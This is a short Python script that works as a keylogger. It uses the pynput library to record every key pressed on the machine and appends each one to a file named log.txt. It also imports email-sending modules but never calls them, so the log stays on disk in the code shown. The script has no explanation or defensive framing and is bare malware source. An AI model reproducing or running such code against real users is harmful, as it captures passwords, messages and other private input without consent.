import pynput
import smtplib
from email.message import EmailMessage



def writeToFile(k):
    with open("log.txt","a") as f:
        k = str(k)
        k = k.replace("'","")
        k = k.replace("Key.space"," space ")
        f.write(k)

        


with pynput.keyboard.Listener(on_press = writeToFile) as l:
    l.join()    
